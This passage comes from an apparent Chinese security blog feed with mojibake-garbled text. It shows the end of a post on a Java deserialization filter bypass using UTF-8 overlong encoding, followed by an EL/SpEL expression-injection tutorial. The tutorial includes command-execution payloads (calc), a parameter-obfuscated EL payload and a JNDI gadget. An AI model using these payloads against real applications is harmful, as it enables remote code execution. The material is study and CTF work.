put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>            put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>            put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>            put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>            put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>            put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>            put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>            put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>            put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>            put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>            put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>            put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>            put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>            put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>            put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>            put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>            put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>            put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>            put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>            put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>            put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>            put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>            put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>            put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>            put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>            put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br>        &#125;&#125;;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">UTF8OverlongObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-built_in">super</span>(out);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeClassDescriptor</span><span class="hljs-params">(ObjectStreamClass desc)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br><span class="hljs-comment">//        writeUTF(desc.getName());</span><br>                writeShort(name.length() * <span class="hljs-number">2</span>);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>                    <span class="hljs-type">char</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> name.charAt(i);<br><span class="hljs-comment">//            System.out.println(s);</span><br>                    write(map.get(s)[<span class="hljs-number">0</span>]);<br>                    write(map.get(s)[<span class="hljs-number">1</span>]);<br>                &#125;<br>                writeLong(desc.getSerialVersionUID());<br>                <span class="hljs-type">byte</span> <span class="hljs-variable">flags</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;externalizable&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;<br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">protocolField</span> <span class="hljs-operator">=</span> ObjectOutputStream.class.getDeclaredField(<span class="hljs-string">&quot;protocol&quot;</span>);<br>                    protocolField.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> (Integer) protocolField.get(<span class="hljs-built_in">this</span>);<br>                    <span class="hljs-keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;<br>                        flags |= ObjectStreamConstants.SC_BLOCK_DATA;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;serializable&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_SERIALIZABLE;<br>                &#125;<br>                <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;hasWriteObjectData&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_WRITE_METHOD;<br>                &#125;<br>                <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;isEnum&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_ENUM;<br>                &#125;<br>                writeByte(flags);<br>                ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, <span class="hljs-string">&quot;fields&quot;</span>);<br>                writeShort(fields.length);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; fields.length; i++) &#123;<br>                    <span class="hljs-type">ObjectStreamField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> fields[i];<br>                    writeByte(f.getTypeCode());<br>                    writeUTF(f.getName());<br>                    <span class="hljs-keyword">if</span> (!f.isPrimitive()) &#123;<br>                        <span class="hljs-type">Method</span> <span class="hljs-variable">writeTypeString</span> <span class="hljs-operator">=</span> ObjectOutputStream.class.getDeclaredMethod(<span class="hljs-string">&quot;writeTypeString&quot;</span>, String.class);<br>                        writeTypeString.setAccessible(<span class="hljs-literal">true</span>);<br>                        writeTypeString.invoke(<span class="hljs-built_in">this</span>, f.getTypeString());<br><span class="hljs-comment">//                    writeTypeString(f.getTypeString());</span><br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>suidææƒå‘ç°sudoå¯ç”¨ï¼Œä¸”è®¾ç½®çš„NOPASSWDï¼Œç›´æ¥äº¤äº†ï¼š</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822164657573.png" alt="image-20240822164657573"></p><p>fjé“¾å’Œå†…å­˜é©¬æ‰“æ³•ï¼š<a href="https://blog.csdn.net/uuzeray/article/details/139222583?spm=1001.2014.3001.5501">ã€Webã€‘2024 äº¬éº’CTF ezjvavé¢˜è§£_äº¬éºŸctf webwp-CSDNåšå®¢</a></p><p>Hessianä¸­å…¶å®ä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜ï¼Œè¯¦è§X1å¸ˆå‚…çš„æ–‡ç« <a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">Hessian UTF-8 Overlong Encoding - X1r0z Blog (exp10it.io)</a></p><p>å‚è€ƒé“¾æ¥è§æ–‡ä¸­ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>El&amp;Spel</title>
    <link href="/2024/08/22/El-Spel/"/>
    <url>/2024/08/22/El-Spel/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åˆè¢«å·åˆ°äº†ï¼Œæ¥ç‚¹è¡¨è¾¾å¼æ³¨å…¥ã€‚</p><p>æˆ‘çœŸçš„å—ä¸äº†å·ç‹—äº†ã€‚ç®€ç›´æ˜¯ç‹ ç‹ pushæˆ‘æ›´æ–°çš„åŠ¨åŠ›å•Šã€‚</p><p>Javaä¸­è¡¨è¾¾å¼æ ¹æ®æ¡†æ¶åˆ†ä¸ºå¥½å¤šç§ï¼Œè¿™é‡Œä»¥JSPè‡ªå¸¦çš„è¡¨è¾¾å¼è¯­è¨€ <code>EL</code> å’Œä½¿ç”¨è¾ƒå¤šçš„Springæ¡†æ¶æ‰€æ”¯æŒçš„<code>SpEL</code>ä¸ºä¾‹ã€‚</p><p>å…¶åŸºæœ¬è¯­æ³•ä¸º<code>$&#123;å˜é‡è¡¨è¾¾å¼&#125;</code>ã€‚</p><h2 id="El-Attack"><a href="#El-Attack" class="headerlink" title="El-Attack"></a>El-Attack</h2><p>ä¸ºäº†ç®€åŒ– JSP é¡µé¢ï¼ŒJSP 2.0 æ–°å¢äº† ELï¼ˆExpression Languageï¼‰è¡¨è¾¾å¼è¯­è¨€ <code>$&#123;ELè¡¨è¾¾å¼&#125;</code></p><p>Tomcatã€Weblogicã€Jettyç­‰Webå®¹å™¨å‡æ”¯æŒELè¡¨è¾¾å¼</p><p>è‹¥ELè¡¨è¾¾å¼æ²¡æœ‰ç”Ÿæ•ˆï¼Œéœ€è¦å¼€å¯ELè¡¨è¾¾å¼</p><ul><li><p>æ³•ä¸€ï¼šå°† page æŒ‡ä»¤ä¸­çš„ <code>isELIgnored</code> å±æ€§è®¾ç½®ä¸º false</p><p><code>&lt;%@ page isELIgnored=&quot;false&quot; %&gt;</code></p></li><li><p>æ³•äºŒï¼š<code>web.xml</code> ä¸­é…ç½® <code>&lt;el-ignored&gt;</code> å…ƒç´ </p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;jsp-property-group&gt;<br>    &lt;url-pattern&gt;*jsp&lt;/url-pattern&gt;<br>    &lt;el-ignored&gt;<span class="hljs-literal">false</span>&lt;/el-ignored&gt;<br>&lt;/jsp-propery-group&gt;<br></code></pre></td></tr></table></figure></li></ul><p>ELè¡¨è¾¾å¼ä¸­æœ‰å¾ˆå¤šå†…ç½®å¯¹è±¡</p><table><thead><tr><th align="left">å†…ç½®å¯¹è±¡</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">pageScope</td><td align="left">è·å– page èŒƒå›´çš„å˜é‡</td></tr><tr><td align="left">requestScope</td><td align="left">è·å– request èŒƒå›´çš„å˜é‡</td></tr><tr><td align="left">sessionScope</td><td align="left">è·å– session èŒƒå›´çš„å˜é‡</td></tr><tr><td align="left">applicationScope</td><td align="left">è·å– application èŒƒå›´çš„å˜é‡</td></tr><tr><td align="left">param</td><td align="left">ç›¸å½“äº request.getParameter(String name)ï¼Œè·å–å•ä¸ªå‚æ•°çš„å€¼</td></tr><tr><td align="left">paramValues</td><td align="left">ç›¸å½“äº request.getParameterValues(String name)ï¼Œè·å–å‚æ•°é›†åˆä¸­çš„å˜é‡å€¼</td></tr><tr><td align="left">header</td><td align="left">ç›¸å½“äº request.getHeader(String name)ï¼Œè·å– HTTP è¯·æ±‚å¤´ä¿¡æ¯</td></tr><tr><td align="left">headerValues</td><td align="left">ç›¸å½“äº request.getHeaders(String name)ï¼Œè·å– HTTP è¯·æ±‚å¤´æ•°ç»„ä¿¡æ¯</td></tr><tr><td align="left">initParam</td><td align="left">ç›¸å½“äº application.getInitParameter(String name)ï¼Œè·å– web.xml æ–‡ä»¶ä¸­çš„å‚æ•°å€¼</td></tr><tr><td align="left">cookie</td><td align="left">ç›¸å½“äº request.getCookies()ï¼Œè·å– cookie ä¸­çš„å€¼</td></tr><tr><td align="left">pageContext</td><td align="left">è¡¨ç¤ºå½“å‰ JSP é¡µé¢çš„ pageContext å¯¹è±¡</td></tr></tbody></table><p>ELè¡¨è¾¾å¼ä¸ä»…å¯ä»¥ä»¥æ–‡æœ¬å…ƒç´ çš„å½¢å¼å‡ºç°ï¼Œä¹Ÿå¯ä»¥å‡ºç°åœ¨Jspæ ‡ç­¾ä¸­</p><h3 id="Jsp-vs-El"><a href="#Jsp-vs-El" class="headerlink" title="Jsp vs El"></a>Jsp vs El</h3><p>ç›¸æ¯”Jspï¼ŒELè¡¨è¾¾å¼çš„æ‰§è¡Œä¼šæ›´åŠ çµæ´»</p><ul><li>workâœ”ï¸</li></ul><blockquote><p>&lt;%</p><p>((ScriptEngineManager)â€â€.getClass().<em>forName</em>(â€œjavax.script.ScriptEngineManagerâ€).newInstance()).getEngineByName(â€œjsâ€).eval(â€œjava.lang.Runtime.getRuntime().exec(â€˜calcâ€™)â€);</p><p>%&gt;</p></blockquote><ul><li>failâœ–ï¸</li></ul><blockquote><p>&lt;% â€œâ€.getClass().<em>forName</em>(â€œjavax.script.ScriptEngineManagerâ€).newInstance().getEngineByName(â€œjsâ€).eval(â€œjava.lang.Runtime.getRuntime().exec(â€˜calcâ€™)â€);</p><p>%&gt;</p><p>The method getEngineByName(String) is undefined for the type</p></blockquote><ul><li>workâœ”ï¸</li></ul><blockquote><p>${â€œâ€.getClass().forName(â€œjavax.script.ScriptEngineManagerâ€).newInstance().getEngineByName(â€œjsâ€).eval(â€œjava.lang.Runtime.getRuntime().exec(â€˜calcâ€™)â€)}</p></blockquote><p>å¯è§ELè¡¨è¾¾å¼èƒ½å¤Ÿè‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼ŒTomcatå†…ç½®çš„JSPå¼•æ“â€”â€”Apache Jasperå¦‚ä½•æ‰§è¡ŒELè¡¨è¾¾å¼å°±ä¸è·Ÿäº†ã€‚</p><p>ç›´æ¥ç»™å‡ºç»“è®ºï¼š</p><p>è¿™ç§è°ƒç”¨æ–¹å¼è®©æ–¹æ³•ä»¥å­—ç¬¦ä¸²çš„å½¢å¼å‡ºç°ï¼Œå¯ä»¥æŠŠç”¨è°ƒç”¨çš„å‚æ•°é€šè¿‡å¤–éƒ¨å‚æ•°ä¼ å…¥ï¼Œå®ç°æ›´éšè”½çš„ELæ‰§è¡Œ</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-string">&quot;&quot;</span>[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)&#125;<br></code></pre></td></tr></table></figure></blockquote><blockquote><p>a&#x3D;getClass&amp;b&#x3D;forName&amp;c&#x3D;javax.script.ScriptEngineManager&amp;d&#x3D;newInstance&amp;e&#x3D;getEngineByName&amp;f&#x3D;js&amp;g&#x3D;eval&amp;h&#x3D;java.lang.Runtime.getRuntime().exec(â€˜calcâ€™)</p></blockquote><h3 id="Getter-Setter"><a href="#Getter-Setter" class="headerlink" title="Getter &amp; Setter"></a>Getter &amp; Setter</h3><p>ELè¡¨è¾¾å¼ä¸æ”¯æŒ<code>Object a = xxx</code>æ¥å­˜å‚¨ä¸´æ—¶å±€éƒ¨å˜é‡ã€‚å¯ä»¥åˆ©ç”¨å†…ç½®å¯¹è±¡æ¥å­˜å‚¨ã€‚</p><p>å¹¶ä¸”ç‚¹å·å±æ€§å–å€¼ç›¸å½“äºæ‰§è¡Œå¯¹è±¡çš„getteræ–¹æ³•ï¼Œç­‰å·å±æ€§èµ‹å€¼åˆ™ç­‰åŒäºæ‰§è¡Œsetteræ–¹æ³•</p><blockquote><p>${pageContext.setAttribute(â€œobjâ€, â€œâ€.getClass().forName(â€œcom.sun.rowset.JdbcRowSetImplâ€).newInstance());</p><p>pageContext.getAttribute(â€œobjâ€).dataSourceName&#x3D;â€ldap:&#x2F;&#x2F;127.0.0.1:8099&#x2F;aâ€;</p><p>pageContext.getAttribute(â€œobjâ€).autoCommit&#x3D;true}</p></blockquote><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.el.parser.AstAssign#getValue<br></code></pre></td></tr></table></figure><p>-&gt; <code>org.apache.el.parser.AstValue#getValue</code></p><p> -&gt; <code>org.apache.el.parser.AstValue#setValue</code></p><p> -&gt; <code>javax.el.CompositeELResolver#setValue</code></p><p> -&gt; <code>javax.el.BeanELResolver#setValue</code></p></blockquote><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å¯¹åº”äºJSPé¡µé¢ä¸­çš„pageContextå¯¹è±¡</span><br>$&#123;pageContext&#125;<br><span class="hljs-comment">//è·å–Webè·¯å¾„</span><br>$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>)&#125;<br><span class="hljs-comment">//æ–‡ä»¶å¤´å‚æ•°</span><br>$&#123;header&#125;<br><span class="hljs-comment">//è·å–webRoot</span><br>$&#123;applicationScope&#125;<br><span class="hljs-comment">//æ‰§è¡Œå‘½ä»¤</span><br>$&#123;pageContext.setAttribute(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass()).invoke(<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&quot;calc.exe&quot;</span>))&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦è¿˜æ˜¯é€šè¿‡åå°„çš„æ–¹å¼å»å‘½ä»¤æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“ç»•è¿‡è¿‡æ»¤ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).eval(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><h2 id="SpEL-Attack"><a href="#SpEL-Attack" class="headerlink" title="SpEL-Attack"></a>SpEL-Attack</h2><p>SpELï¼šSpring Expression Language ä¸€ç§è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼Œç±»ä¼¼äºELè¡¨è¾¾å¼ã€‚</p><p>SpEL çš„è¯ç”Ÿæ˜¯ä¸ºäº†ç»™ Spring ç¤¾åŒºæä¾›ä¸€ç§èƒ½å¤Ÿä¸Spring ç”Ÿæ€ç³»ç»Ÿæ‰€æœ‰äº§å“æ— ç¼å¯¹æ¥ï¼Œèƒ½æä¾›ä¸€ç«™å¼æ”¯æŒçš„è¡¨è¾¾å¼è¯­è¨€ã€‚</p><p>SpELåŸºæœ¬è¯­æ³•ï¼š SpELä½¿ç”¨ <code>#&#123;...&#125;</code>ä½œä¸ºå®šç•Œç¬¦ï¼Œå¤§æ‹¬å·å†…è¢«è§†ä¸ºSpELè¡¨è¾¾å¼ï¼Œé‡Œé¢å¯ä»¥ä½¿ç”¨è¿ç®—ç¬¦ï¼Œå˜é‡ï¼Œè°ƒç”¨æ–¹æ³•ç­‰ã€‚ä½¿ç”¨ <code>T()</code> è¿ç®—ç¬¦ä¼šè°ƒç”¨ç±»ä½œç”¨åŸŸçš„æ–¹æ³•å’Œå¸¸é‡ï¼Œå¦‚<code>#&#123;T(java.lang.Math)&#125;</code>è¿”å›ä¸€ä¸ªjava.lang.Mathç±»å¯¹è±¡ã€‚</p><p><code>#&#123;&#125;</code>å’Œ<code>$&#123;&#125;</code>çš„åŒºåˆ«ï¼š</p><ul><li><code>#&#123;&#125;</code> ç”¨äºæ‰§è¡ŒSpElè¡¨è¾¾å¼ï¼Œå¹¶å°†å†…å®¹èµ‹å€¼ç»™å±æ€§</li><li><code>$&#123;&#125;</code> ä¸»è¦ç”¨äºåŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶ä¸­çš„å€¼</li></ul><p>SpELå¸¸ç”¨åœ¨ä¸‰ä¸ªåœ°æ–¹ã€‚</p><ol><li><p>Valueæ³¨è§£ ï¼ˆæ³¨ï¼šè¿™ä¸ªç±»è¦é€šè¿‡ä¾èµ–æ³¨å…¥æ‰èƒ½ä½¿Valueæ³¨è§£ç”Ÿæ•ˆï¼Œç›´æ¥newå¯¹è±¡æ˜¯ä¸è¡Œçš„ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo1.bean;<br><br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Value;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.PropertySource;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@PropertySource(&#123;&quot;classpath:/configure.properties&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;spring.user.name&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> String userName; <span class="hljs-comment">// å€¼æ¥è‡ªapplication.properties</span><br>    <span class="hljs-meta">@Value(&quot;$&#123;home.dorm&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> String address; <span class="hljs-comment">// å€¼æ¥è‡ªconfigure.properties(æ”¾åœ¨resourcesæ–‡ä»¶å¤¹ä¸‹)</span><br>    <span class="hljs-meta">@Value(&quot;#&#123;T(java.lang.Math).random()&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> age;<br>    <span class="hljs-meta">@Value(&quot;#&#123;systemProperties[&#x27;os.name&#x27;]&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> String sys; <span class="hljs-comment">// æ³¨å…¥æ“ä½œç³»ç»Ÿå±æ€§</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// configure.properties</span><br>home.dorm=Room402,Unit4,Building3,No<span class="hljs-number">.34</span>.LousyLoad<br><span class="hljs-comment">// application.properti</span><br>spring.user.name=Taco<br></code></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š <code>User&#123;userName=&#39;Taco&#39;, address=&#39;Room402,Unit4,Building3,No.34.LousyLoad&#39;, age=0.5913714334107036, sys=&#39;Windows 10&#39;&#125;</code></p></li><li><p>XML</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Book&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.bean&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;è¡¨è¾¾å¼&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>Expressionæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">spelTest</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;(&#x27;Hello &#x27;+&#x27;SpEL&#x27;).concat(#end)&quot;</span>);<br>    <span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>    context.setVariable(<span class="hljs-string">&quot;end&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>);<br>    System.out.println(expression.getValue(context));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡º<code>Hello SpEL!</code></p></li></ol><p>å®é™…æƒ…å†µä¸‹ï¼Œä¸€èˆ¬éƒ½æ˜¯åŸºäºä¸Šé¢ç¬¬ä¸‰ç§SpELçš„ä½¿ç”¨åœºæ™¯å‡ºç°çš„æ¼æ´ã€‚ ä¸‹é¢ç®€å•åˆ†æä¸€ä¸‹SpELåœ¨æ±‚è¡¨è¾¾å¼å€¼çš„è¿‡ç¨‹</p><blockquote><p>1.åˆ›å»ºè§£æå™¨ new SpelExpressionParser() 